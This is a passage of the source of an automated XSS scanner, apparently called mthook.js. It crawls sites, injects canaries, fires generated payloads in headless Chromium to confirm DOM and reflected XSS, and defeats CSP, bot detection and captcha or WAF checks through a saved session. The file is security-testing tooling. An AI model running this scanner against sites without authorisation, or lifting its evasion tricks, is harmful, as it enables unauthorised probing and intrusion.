    // value was found on a connected element's URL attribute in the settled
    // DOM (see DOM_PRESENT_JS). (Mirrors mthook.py.)
    if (!payloads.length) return [[], []];
    beat();
    url = inject_canary_params(url, config.canary);
    const confirmedAll = [];
    const domPresentAll = [];
    for (const roundPayloads of partition_payload_rounds(payloads)) {
        const [confirmed, dom_present] = await _process_url_stage2_round(
            context, url, roundPayloads, beat);
        confirmedAll.push(...confirmed);
        domPresentAll.push(...dom_present);
    }
    return [confirmedAll, domPresentAll];
}

async function _process_url_stage2_round(context, url, roundPayloads, beat) {
    // One stage-2 reload for a single delivery round (each key at most
    // once). Returns [confirmed, domPresent] for this round's payloads only.
    // (Mirrors mthook.py.)
    const inject_script = build_inject_js(roundPayloads);
    const hasHashPayload = roundPayloads.some(p => p.key === '_hash');
    const target_url = hasHashPayload ? url : url + `#${config.canary}_hash`;

    const page = await context.newPage();
    await page.addInitScript({ content: inject_script });
    await page.route('**/*', stage2Route);
    try {
        try {
            await page.goto(target_url, { timeout: 10000, waitUntil: 'commit' });
        } catch { /* timeout ok */ }
        beat();
        // Settle before starting the verification clock: heavy SPA/ad pages
        // keep booting (bundle fetch, hydration, ad auctions) for seconds
        // after commit, and the alertfunc call often fires only after the
        // page has gone network-idle once. A fixed window measured from
        // commit loses that race on cold loads (observed on finance.mail.ru
        // slot-data). Mirrors stage 1; -w raises the window. (Mirrors
        // mthook.py.)
        {
            const ms = stage1_wait ? Math.round(stage1_wait * 1000) : STAGE1_NETIDLE_MS;
            try { await page.waitForLoadState('networkidle', { timeout: ms }); } catch { /* ignore */ }
        }
        beat();
        // All keys in a round are distinct (partition_payload_rounds), so
        // this count is reachable: jsEvals dedupes by key, and each key can
        // fire at most once here. With the old single-map delivery two
        // payloads on one key made this wait unsatisfiable by construction.
        const expected = roundPayloads.length;
        try {
            await page.waitForFunction(
                (n) => window.rsjsstorage && window.rsjsstorage.jsEvals.length >= n,
                // Heavy SPAs hydrate long after `commit`; the sink path (and
                // the alertfunc call) often fires seconds later. 1.5s
                // systematically under-confirmed; 5s covers hydration + late
                // timers without dominating scan time (stage 2 only runs on
                // pages with sinks). Mirrors mthook.py.
                expected, { timeout: 5000 });
        } catch { /* timeout ok */ }
        beat();
        const js_evals = await page.evaluate(
            () => (window.rsjsstorage ? window.rsjsstorage.jsEvals : null));
        const evals = js_evals || [];
        // Key-based match is sound within a round: the round shipped exactly
        // one payload for this key, so the key in jsEvals can only have
        // come from that payload firing.
        const confirmed = roundPayloads.filter(p => evals.includes(p.key));
        // DOM presence of the URL payloads — the confirmation for element URL
        // sinks, which stage 2 can't click. Checked on the settled page so the
        // same SPA hydration that delays alertfunc delays the link too. A
        // navigation happening right at the end (context destroyed) must not
        // throw away the exec results already collected. (Mirrors mthook.py.)
        let dom_present = [];
        const url_payloads = roundPayloads.filter(p => p.ctx === 'url');
        if (url_payloads.length) {
            try {
                const hits = new Set(await page.evaluate(dom_present_in_page,
                    url_payloads.map(p => p.payload)) || []);
                dom_present = url_payloads.filter(p => hits.has(p.payload));
            } catch (e) {
                if (isClosedError(e)) throw e;
                eprint(`[stage2 dom-check] ${target_url} ${e}`);
            }
        }
        return [confirmed, dom_present];
    } catch (e) {
        if (isClosedError(e)) throw e;  // dead browser: exit fast, let the worker recycle
        eprint(`[stage2 error] ${target_url} ${e}`);
        return [[], []];
    } finally {
        try { await page.close(); } catch { /* ignore */ }
    }
}

async function process_url_stage2_reflected(context, base_url, payloads, beat = () => {}) {
    // Confirm server-side reflected XSS by navigating with the payload as the
    // raw query value (no JS hooks — the server has to be doing the reflection
    // for execution to fire).
    if (!payloads.length) return [];
    const confirmed = [];
    for (const p of payloads) {
        beat();  // payloads legitimately take minutes in aggregate — keep the stall clock fresh
        const target_url = build_payload_url(base_url, p.key, p.payload);
        let page;
        try {
            page = await context.newPage();
        } catch (e) {
            if (isClosedError(e)) throw e;  // dead browser: stop, don't burn the remaining payloads
            eprint(`[stage2-reflected new_page] ${target_url} ${e}`);
            continue;
        }
        await page.route('**/*', stage2Route);
        try {
            try {
                await page.goto(target_url, { timeout: 10000, waitUntil: 'commit' });
            } catch { /* timeout ok */ }
            beat();
            // Same settle as processUrlStage2: verification clock starts only
            // after the page went network-idle once. Mirrors stage 1; -w
            // raises it. (Mirrors mthook.py.)
            {
                const ms = stage1_wait ? Math.round(stage1_wait * 1000) : STAGE1_NETIDLE_MS;
                try { await page.waitForLoadState('networkidle', { timeout: ms }); } catch { /* ignore */ }
            }
            beat();
            try {
                await page.waitForFunction(
                    (k) => window.rsjsstorage && window.rsjsstorage.jsEvals.includes(k),
                    // Same rationale as process_url_stage2: SPA hydration and
                    // late timers need more than 1.5s. Mirrors mthook.py.
                    p.key, { timeout: 5000 });
            } catch { /* timeout ok */ }
            const js_evals = await page.evaluate(
                () => (window.rsjsstorage ? window.rsjsstorage.jsEvals : null)) || [];
            if (js_evals.includes(p.key)) confirmed.push(p);
        } catch (e) {
            if (isClosedError(e)) throw e;  // dead browser: stop, don't burn the remaining payloads
            eprint(`[stage2-reflected error] ${target_url} ${e}`);
        } finally {
            try { await page.close(); } catch { /* ignore */ }
        }
    }
    return confirmed;
}

// ---------------------------------------------------------------------------
// stage 1 — discovery
// ---------------------------------------------------------------------------

const HTML_CONTENT_TYPES = ['text/html', 'application/xhtml+xml', 'text/xml', 'application/xml'];

function is_html_content_type(ct) {
    // True if a main-document response with this Content-Type could be an
    // HTML page Chromium renders and runs scripts in. 'text/html' also covers
    // text/html-sandboxed via substring; the XML types cover XHTML payloads
    // (rendered in XML mode). An empty/absent type counts too: Chromium
    // sniffs unknown types and may render HTML with scripts running, so the
    // reflection scan still needs the body. The canary is unique, so scanning
    // a non-HTML body can't false-positive.
    const v = (ct || '').trim().toLowerCase();
    if (!v) return true;
    return HTML_CONTENT_TYPES.some((t) => v.includes(t));
}

async function process_url(context, url, beat = () => {}, linksOut = null) {
    const url_domain = netloc(url);
    if (domain_is_blocked(url_domain)) return;

    let page;
    try {
        page = await context.newPage();
    } catch (e) {
        eprint(`[${url_domain}] new_page: ${e}`);
        return;
    }

    try {
        url = inject_canary_params(url, config.canary);
        const canary = config.canary;
        const target_url = url + `#${canary}_hash`;
        const target_url_no_hash = target_url.split('#')[0];

        // The document that actually RENDERS: the last non-redirect main-frame
        // navigation response. Keying on the requested URL (the old approach)
        // only ever saw the first hop, so redirected URLs (http->https,
        // apex->www, trailing slash) never had their final HTML captured for
        // the reflection scan, a redirect to a non-HTML target wasn't skipped,
        // and a WAF block page behind a redirect was invisible to the >=400
        // warning. 3xx never decides (the chain continues); 204 never decides
        // (nav_route fulfills canary navigations with 204, and a 204 renders
        // nothing). The body is fetched lazily at analysis time, so
        // superseded hops cost nothing.
        const mainDoc = { response: null, status: null, ct: '' };

        page.on('response', (response) => {
            try {
                const req = response.request();
                if (!req.isNavigationRequest()
                        || req.resourceType() !== 'document'
                        || req.frame() !== page.mainFrame()) return;
                const status = response.status();
                if (status === 204 || (status >= 300 && status < 400)) return;
                mainDoc.response = response;
                mainDoc.status = status;
                mainDoc.ct = response.headers()['content-type'] || '';
            } catch { /* ignore */ }
        });

        // Capture canary-containing navigations at the network layer.
        // In Chromium, Location.{assign,replace,href} cannot be hooked from JS,
        // so we intercept here. The initial goto is allowed; any later
        // main-frame nav whose URL contains the canary is recorded as
        // `location_nav` and fulfilled with HTTP 204 (keeps the page put and
        // preserves rsjsstorage — abort() lands on chrome-error:// and wipes it).
        const nav_sinks = [];
        const src_rgx = canaryRegex(canary);

        await page.route('**/*', async (route, request) => {
            try {
                if (BLOCKED_RESOURCE_TYPES.has(request.resourceType())) {
                    await route.abort();
                    return;
                }
                if (request.isNavigationRequest()
                        && request.frame() === page.mainFrame()
                        && request.url().split('#')[0] !== target_url_no_hash
                        && request.url().includes(canary)) {
                    const keys = keysFrom(request.url(), src_rgx);
                    nav_sinks.push({ sink: 'location_nav', sources: keys, code: request.url() });
                    await route.fulfill({ status: 204, body: '' });
                    return;
                }
            } catch { /* ignore */ }
            try { await route.continue(); } catch { /* ignore */ }
        });

        let goto_err = null;
        try {
            await page.goto(target_url, { timeout: 10000, waitUntil: 'commit' });
        } catch (e) { goto_err = e; /* timeout ok; net errors handled below */ }

        if (mainDoc.response && !is_html_content_type(mainDoc.ct)) {
            // The final document of the FIRST request's redirect chain came
            // back non-HTML (JSON/PDF/plain text/binary/...): no page JS ever
            // runs, so there are no DOM sinks to find and no reflection body
            // was captured — the settle wait, evaluate and any stage-2
            // requests are pure waste. Omit the URL here. (SVG main documents
            // are also omitted even though scripts run there: verified
            // empirically that sources register, but in XML mode innerHTML
            // with any HTML markup THROWS, so the HTML-breakout confirmation
            // payloads can never execute — only pure JS sinks could confirm,
            // which is negligible on top of SVG-as-main-document being rare.)
            if (debug_mode) {
                eprint(`[skip non-html] ${url} content-type='${mainDoc.ct}' status=${mainDoc.status}`);
            }
            if (mainDoc.status && mainDoc.status >= 400) {
                eprint(`[${url_domain}] main document ${mainDoc.status} for ${url} `
                    + `(likely blocked/rate-limited — no findings possible)`);
            }
            return;
        }

        // Post-commit settle. 'load'/'domcontentloaded' never fire on pages
        // where an IIFE triggers a canary nav we 204; networkidle is safer
        // because the 204 closes the request stream. Always wait for
        // networkidle: a flat 300 ms read rsjsstorage before hydration
        // finished, missing every sink that fires late (SPA/ad-slot innerHTML
        // routinely lands 1-3 s after commit — e.g. finance.mail.ru
        // slot-data). -w raises the window; default STAGE1_NETIDLE_MS.
        {
            const ms = stage1_wait ? Math.round(stage1_wait * 1000) : STAGE1_NETIDLE_MS;
            try {
                await page.waitForLoadState('networkidle', { timeout: ms });
            } catch { /* ignore */ }
        }

        // The target never actually loaded: a net-layer failure (connection
        // reset, cert error, DNS/unsafe port, etc.) lands Chromium on
        // chrome-error://chromewebdata/, and a 204'd initial nav leaves it on
        // about:blank. preload.js skips both, so rsjsstorage is absent there —
        // there's no page to scan. Surface the real reason instead of a
        // misleading "[no findings]".
        const landed = page.url();
        if (landed.startsWith('chrome-error://') || landed === 'about:blank') {
            if (debug_mode) {
                const reason = goto_err ? String(goto_err.message).split('\n')[0] : 'no document committed';
                eprint(`[load failed] ${url} (${reason})`);
            }
            return;
        }

        // Crawl: harvest same-site links from the rendered DOM now — after
        // the networkidle settle (SPA routers have emitted their <a>s) but
        // before any early return below, so every successfully landed page
        // contributes links even if it yields no sinks. (Mirrors mthook.py.)
        if (linksOut) {
            try {
                const hrefs = await page.evaluate(() => {
                    const out = Array.from(document.querySelectorAll('a[href]'))
                        .map((a) => a.href);
                    // GET forms: a param the site only reads from a form
                    // field is invisible to link harvesting, and topparams
                    // pushState can't feed the server (it rewrites the URL
                    // client-side AFTER the document was fetched). Probe
                    // the action URL with each control's name instead —
                    // inject_canary_params turns the values into canaries
                    // at scan time and the reflection/stage-2 pipeline
                    // handles the rest. GET only: a POST param can't ride
                    // a URL, so no PoC could be emitted. Per the HTML
                    // spec a GET submit REPLACES the action's query with
                    // the form data, so replace here too (and a
                    // no-action form submits to the current URL — its
                    // pushState'd topparams drop, which is faithful).
                    // (Mirrors mthook.py.)
                    for (const f of document.querySelectorAll('form')) {
                        const method =
                            (f.getAttribute('method') || 'get').toUpperCase();
                        if (method !== 'GET') continue;
                        let action;
                        try {
                            action = new URL(f.getAttribute('action') || location.href,
                                             location.href);
                        } catch (e) { continue; }
                        if (action.protocol !== 'http:' && action.protocol !== 'https:') continue;
                        if (action.origin !== location.origin) continue;
                        const names = [];
                        for (const el of f.elements) {
                            if (!el.name || names.indexOf(el.name) !== -1) continue;
                            const t = (el.getAttribute('type') || el.tagName).toLowerCase();
                            if (t === 'submit' || t === 'button' || t === 'reset'
                                || t === 'image' || t === 'file') continue;
                            names.push(el.name);
                        }
                        if (!names.length) continue;
                        action.search = names.map((n) => n + '=x').join('&');
                        out.push(action.href);
                    }
                    return out;
                });
                linksOut.push(...(hrefs || []));
            } catch { /* page navigated on; links are best-effort */ }
        }

        const rsjsstorage = await page.evaluate(() => window.rsjsstorage);
        if (!rsjsstorage) {
            eprint(`[${url_domain}] no rsjsstorage (preload didn't run; page at ${page.url()})`);
            return;
        }

        const current_url = rsjsstorage.originurl;

        const domain = netloc(current_url);
        rsjsstorage.dom_url = build_dom_url(current_url, rsjsstorage.uspRevealed || [], canary);

        // check raw response for reflected canary with context (the final
        // document after any redirects)
        let new_reflected = [];
        if (mainDoc.response) {
            let raw = null;
            try { raw = await mainDoc.response.text(); } catch { /* ignore */ }
            if (raw) {
                const reflected = find_reflected_canaries(raw, canary);
                new_reflected = filter_new_reflected(domain, reflected);
                if (new_reflected.length) rsjsstorage.reflected = new_reflected;
            }
        }

        let merged_sinks = (rsjsstorage.sinks || []).concat(nav_sinks);
        const noise_before = merged_sinks.length;
        merged_sinks = filter_noise_sinks(merged_sinks, current_url, rsjsstorage.dom_url);
        if (debug_mode && merged_sinks.length < noise_before) {
            eprint(`[noise] ${url_domain}: dropped ${noise_before - merged_sinks.length} `
                + `url-copy sink(s) on ${current_url}`);
        }
        const new_sinks = filter_new_sinks(domain, merged_sinks, current_url);

        // Stage 2: generate payloads and verify execution
        const payloads = [];
        for (const s of new_sinks) payloads.push(...get_payloads(s, canary));
        let confirmed = [];
        if (payloads.length) {
            const [exec_confirmed, dom_payloads] = await process_url_stage2(context, url, payloads, beat);
            const url_confirmed = confirm_url_sinks(new_sinks, payloads, dom_payloads, canary);
            const seen = new Set();
            for (const p of exec_confirmed.concat(url_confirmed)) {
                const k = p.key + '\x00' + p.sink;
                if (!seen.has(k)) { seen.add(k); confirmed.push(p); }
            }
            if (debug_mode) {
                const confPairs = new Set(confirmed.map(c => c.key + '\x00' + c.sink));
                for (const s of new_sinks) {
                    if (!isElementUrlSink(s.sink)) continue;
                    const dropped = (s.sources || []).filter(k =>
                        is_url_exploitable(s.code || '', canary, k)
                        && !confPairs.has(k + '\x00' + s.sink));
                    if (dropped.length) {
                        eprint(`[url-sink unconfirmed] ${s.sink} key(s) [${dropped.join(', ')}] on ${current_url}: `
                            + `payload not on any URL attribute of a connected element in the settled DOM `
                            + `(detached/discarded element or value rewritten)`);
                    }
                }
            }
        }

        // Stage 2 (reflected): server-side reflected XSS — navigate with the
        // payload directly in the query and check for alertfunc execution.
        let reflected_payloads = get_reflected_payloads(new_reflected, canary);
        if (reflected_payloads.length) {
            const confirmedKeys = new Set(confirmed.map(c => c.key));
            reflected_payloads = reflected_payloads.filter(p => !confirmedKeys.has(p.key));
            if (reflected_payloads.length) {
                for (const p of await process_url_stage2_reflected(context, url, reflected_payloads, beat)) {
                    confirmed.push(p);
                }
            }
        }

        if (confirmed.length) emit_confirmed(rsjsstorage.dom_url, confirmed);

        // Surface WAF/error pages: a blocked doc has no sinks and reflects
        // nothing, so it's otherwise indistinguishable from a clean page.
        if (mainDoc.status && mainDoc.status >= 400) {
            eprint(`[${url_domain}] main document ${mainDoc.status} for ${url} `
                + `(likely blocked/rate-limited — no findings possible)`);
        }
        if (debug_mode) {
            if (new_sinks.length || (rsjsstorage.reflected && rsjsstorage.reflected.length)) {
                eprint(JSON.stringify({ originurl: rsjsstorage.originurl, dom_url: rsjsstorage.dom_url,
                    uspRevealed: rsjsstorage.uspRevealed, sinks: new_sinks, confirmed,
                    reflected: rsjsstorage.reflected }));
            } else {
                eprint(`[no findings] ${current_url} status=${mainDoc.status} `
                    + `(rsjsstorage ok, 0 sinks / 0 reflected)`);
            }
        }
    } catch (r) {
        // A closed/crashed browser can't be recovered per-URL — re-raise so the
        // worker relaunches it instead of draining the rest of the queue into a
        // dead process (counting each as a per-domain error and hiding the cause).
        if (isClosedError(r)) throw r;
        const count = domain_record_error(url_domain);
        eprint(`[${url_domain} err ${count}/${DOMAIN_MAX_ERRORS}] ${r}`);
    } finally {
        try { await page.close(); } catch { /* ignore */ }
    }
}

// ---------------------------------------------------------------------------
// concurrency
// ---------------------------------------------------------------------------

async function newContext(browser) {
    const context = await browser.newContext({
        bypassCSP: true,
        userAgent: config.ua,
        ignoreHTTPSErrors: true,
        ...(Object.keys(extra_headers).length ? { extraHTTPHeaders: extra_headers } : {}),
        ...(storage_state_path ? { storageState: storage_state_path } : {}),
        ...(viewport ? { viewport } : {}),
    });
    await context.addInitScript({ content: preloadjs });
    return context;
}

function isClosedError(e) {
    const msg = String((e && e.message) || e);
    return msg.includes('has been closed')     // "Target page, context or browser has been closed"
        || msg.includes('Target closed')
        || msg.includes('Target crashed')       // renderer OOM / hard crash
        || msg.includes('Browser closed')
        || msg.includes('Connection closed');
}

function isTimeoutError(e) {
    return String((e && e.message) || e).includes('hang timeout');
}

// Race a promise against a deadline. Playwright's page.evaluate() (and newPage/
// close) have no internal timeout, so a wedged renderer would otherwise hang a
// worker forever. The losing promise is left with a no-op catch so its eventual
// rejection (e.g. once we recycle the context) isn't an unhandled rejection.
function withTimeout(promise, ms, label) {
    let timer;
    promise.catch(() => { /* swallowed if it loses the race */ });
    const deadline = new Promise((_, reject) => {
        timer = setTimeout(() => reject(new Error(`hang timeout ${ms}ms: ${label}`)), ms);
    });
    return Promise.race([promise, deadline]).finally(() => clearTimeout(timer));
}

// Race a task against a *stall* deadline: the clock restarts every time the
// task reports progress via beat(). Same semantics as mthook.py's watchdog —
// stage-2 verification legitimately runs for minutes on pages with many
// sinks/reflected keys, but only while payloads keep completing, so the
// ceiling must measure time WITHOUT progress, not total time. A fixed total
// ceiling (the old worker race) killed healthy stage-2 loops at 60s and
// discarded every unverified payload.
function withStallTimeout(task, ms, label) {
    let timer = null;
    let done = false;
    let expired;
    const deadline = new Promise((_, reject) => { expired = reject; });
    const beat = () => {
        if (done) return;               // zombie task after the race settled: don't re-arm
        if (timer) clearTimeout(timer);
        timer = setTimeout(() => expired(new Error(`hang timeout ${ms}ms: ${label}`)), ms);
    };
    const taskPromise = Promise.resolve().then(() => task(beat));
    taskPromise.catch(() => { /* swallowed if it loses the race */ });
    beat();
    return Promise.race([taskPromise, deadline]).finally(() => {
        done = true;
        clearTimeout(timer);
    });
}

async function closeQuietly(...items) {
    for (const it of items) {
        // Bound the close: a wedged browser can make close() hang too.
        try { if (it) await withTimeout(it.close(), CLOSE_TIMEOUT, 'close'); } catch { /* ignore */ }
    }
}

function launchBrowser() {
    return chromium.launch({
        headless: !headed,
        args: ['--disable-blink-features=AutomationControlled'],
    });
}

async function worker(queue) {
    // Each worker owns its browser so one crash can't take down the others, and
    // recycles it every BROWSER_REFRESH_INTERVAL URLs to cap memory growth.
    let browser = await launchBrowser();
    let context = await newContext(browser);
    let processed = 0;
    const recycle = async () => {
        await closeQuietly(context, browser);
        browser = await launchBrowser();
        context = await newContext(browser);
        processed = 0;
    };
    try {
        while (true) {
            const item = queue.shift();
            if (item === undefined) {
                // Crawl-safe idle exit: crawlPending > 0 means another worker
                // is mid-URL and may still push the links it harvested.
                if (crawlPending === 0) break;
                await sleep(250);
                continue;
            }
            const [url, depth] = item;
            crawlPending++;
            if (processed >= BROWSER_REFRESH_INTERVAL) await recycle();
            try {
                // Stall deadline per URL: process_url handles its own routine
                // errors, and stage 2 beats while payloads complete, so this
                // only fires on a crashed browser or a true hang (renderer
                // stuck in JS — page.evaluate has no internal timeout).
                // Either way the context is suspect — recycle to a fresh
                // browser before the next URL.
                const links = [];
                await withStallTimeout(
                    (beat) => process_url(context, url, beat, crawl_depth > 0 ? links : null),
                    URL_HANG_TIMEOUT, `process_url ${netloc(url)}`);
                crawlEnqueue(queue, crawlFilterLinks(links), depth);
                processed++;
            } catch (e) {
                const why = isTimeoutError(e) ? 'hung' : 'browser closed';
                eprint(`[worker] ${why} on ${netloc(url)}, relaunching: ${e}`);
                await recycle();
            } finally {
                crawlPending--;
            }
        }
    } finally {
        await closeQuietly(context, browser);
    }
}

// ---------------------------------------------------------------------------
// session capture
// ---------------------------------------------------------------------------

async function capture_session(url, savePath, ua, vp) {
    // Open a visible browser at `url`, let the human pass any WAF/captcha, then
    // save cookies + localStorage to `savePath` for reuse with --session.
    const browser = await chromium.launch({
        headless: false,
        args: ['--disable-blink-features=AutomationControlled'],
    });
    const context = await browser.newContext({
        userAgent: ua,
        ignoreHTTPSErrors: true,
        ...(vp ? { viewport: vp } : {}),
    });
    const page = await context.newPage();
    try {
        await page.goto(url, { timeout: 30000, waitUntil: 'commit' });
    } catch (e) {
        eprint(`[capture] goto: ${e}`);
    }
    eprint('\n[capture] A browser window is open. Solve any captcha / wait for the\n'
        + '          real page to load, then press Enter here to save the session.');
    await new Promise((resolve) => {
        if (!process.stdin.isTTY) { setTimeout(resolve, 15000); return; }
        const rl = readline.createInterface({ input: process.stdin });
        rl.question('', () => { rl.close(); resolve(); });
    });
    await context.storageState({ path: savePath });
    const cookies = await context.cookies();
    eprint(`[capture] saved session (${cookies.length} cookies) to ${savePath}`);
    try { await browser.close(); } catch { /* ignore */ }
}

// ---------------------------------------------------------------------------
// templating
// ---------------------------------------------------------------------------

function getInjectJS() {
    return fs.readFileSync(path.join(ROOT, 'js', 'preload_inject.js'), 'utf8');
}

function getPreloadJS() {
    const preloadPath = config.preload_script;
    let content = fs.readFileSync(path.join(ROOT, preloadPath), 'utf8');
    content = content.split('{{canary}}').join(config.canary);
    content = content.replace('"{{topparams}}"', JSON.stringify(config.topparams));
    return content;
}

async function readLines(stream) {
    const lines = [];
    const rl = readline.createInterface({ input: stream, crlfDelay: Infinity });
    for await (const line of rl) {
        const t = line.trim();
        if (t) lines.push(t);
    }
    return lines;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

async function main() {
    preloadjs = getPreloadJS();
    injectjs = getInjectJS();
    fs.writeFileSync(path.join(ROOT, 'js', 'preload_debug.js'), preloadjs);

    let parsed;
    try {
        parsed = parseArgs({
            options: {
                urls: { type: 'string', short: 'u' },
                threads: { type: 'string', short: 't' },
                wait: { type: 'string', short: 'w' },
                output: { type: 'string', short: 'o' },
                debug: { type: 'boolean', short: 'd' },
                dedup: { type: 'boolean', short: 'D' },
                crawl: { type: 'string', short: 'c' },
                'max-urls': { type: 'string' },
                header: { type: 'string', short: 'H', multiple: true },
                ua: { type: 'string' },
                session: { type: 'string' },
                'capture-session': { type: 'string' },
                headed: { type: 'boolean' },
                viewport: { type: 'string' },
                help: { type: 'boolean', short: 'h' },
            },
            allowPositionals: false,
        });
    } catch (e) {
        eprint(`argument error: ${e.message}`);
        process.exit(2);
    }
    const args = parsed.values;

    if (args.help) {
        printHelp();
        return;
    }

    const threads = args.threads ? parseInt(args.threads, 10) : 10;
    stage1_wait = args.wait ? parseFloat(args.wait) : 0;
    crawl_depth = args.crawl ? (parseInt(args.crawl, 10) || 0) : 0;
    crawl_max_urls = args['max-urls'] ? (parseInt(args['max-urls'], 10) || 500) : 500;
    if (crawl_depth > 0) {
        eprint(`[crawl] following same-host links up to depth ${crawl_depth}, `
            + `max ${crawl_max_urls} URLs total`);
    }
    debug_mode = !!args.debug;
    dedup = !!args.dedup;
    headed = !!args.headed;

    if (args.viewport) {
        const m = args.viewport.toLowerCase().split('x');
        const w = parseInt(m[0], 10);
        const h = parseInt(m[1], 10);
        if (!Number.isFinite(w) || !Number.isFinite(h) || m.length !== 2) {
            eprint(`--viewport expects WxH (e.g. 430x932), got: ${args.viewport}`);
            process.exit(2);
        }
        viewport = { width: w, height: h };
    }
    if (args.ua) config.ua = args.ua;

    if (args['capture-session']) {
        if (!args.session) {
            eprint('--capture-session requires --session PATH to save the session to');
            process.exit(2);
        }
        await capture_session(args['capture-session'], args.session, config.ua, viewport);
        return;
    }
    if (args.session) {
        storage_state_path = args.session;
        eprint(`[session] reusing ${storage_state_path} (cookies kept across URLs)`);
    }
    for (const hdr of (args.header || [])) {
        const idx = hdr.indexOf(':');
        if (idx === -1) {
            eprint(`[header] ignoring malformed (expected 'Name: Value'): ${hdr}`);
            continue;
        }
        extra_headers[hdr.slice(0, idx).trim()] = hdr.slice(idx + 1).trim();
    }
    if (args.output) {
        outputStream = fs.createWriteStream(args.output, { flags: 'w' });
    }

    // Read all URLs up front (from file or stdin), then process with a pool.
    let urls;
    if (args.urls) {
        urls = (await readLines(fs.createReadStream(args.urls))).slice();
    } else {
        // No -u and stdin is an interactive terminal (not piped/redirected):
        // reading it would block forever waiting for the user. Show usage and
        // exit instead of hanging.
        if (process.stdin.isTTY) {
            eprint('no input: pass -u FILE or pipe URLs on stdin (see --help)');
            process.exit(2);
        }
        urls = await readLines(process.stdin);
    }

    if (!urls.length) {
        eprint('no URLs to process');
        return;
    }

    const queue = [];  // workers .shift() [url, depth] from this shared array
    for (const u of urls) {
        if (crawlSeen.has(u)) continue;
        crawlSeen.add(u);
        crawlEnqueued++;
        if (crawl_depth > 0) {
            try { crawlHosts.add(new URL(u).host); } catch { /* malformed seed */ }
        }
        queue.push([u, 0]);
    }
    const n = Math.max(1, Math.min(threads, queue.length));
    const workers = [];
    for (let i = 0; i < n; i++) workers.push(worker(queue));  // each worker owns/recycles its browser
    await Promise.all(workers);

    if (outputStream) outputStream.end();
}

function printHelp() {
    process.stdout.write(`Usage: node mthook.js [options]

  -u, --urls FILE        File containing URLs to process (else read stdin)
  -t, --threads N        Concurrent workers (default 10)
  -w, --wait SECONDS     networkidle settle window in seconds, stage 1 and
                         stage-2 verification (default: 3s built in; raise
                         for slow SPA/ad hydration)
  -o, --output FILE      File to write confirmed findings to (truncated)
  -d, --debug            Print unconfirmed sinks and reflected hits to stderr
  -D, --dedup            Enable per-domain sink/reflected deduplication
  -c, --crawl DEPTH      Crawl mode: harvest same-host links from every scanned
                         page and scan them up to DEPTH levels deep (default off)
      --max-urls N       Cap on total URLs scanned when crawling (default 500;
                         seeds are always scanned)
  -H, --header "N: V"    Extra HTTP header sent on every request (repeatable)
      --ua UA            Override the User-Agent from config.yaml
      --session PATH     Load storageState JSON and keep cookies across URLs
      --capture-session URL  Headed capture: solve WAF/captcha, save --session
      --headed           Run browsers visibly (needs a display)
      --viewport WxH     Fixed viewport size, e.g. 430x932 (default 1280x720)
`);
}

main().catch((e) => {
    eprint(`fatal: ${e && e.stack ? e.stack : e}`);
    process.exit(1);
});
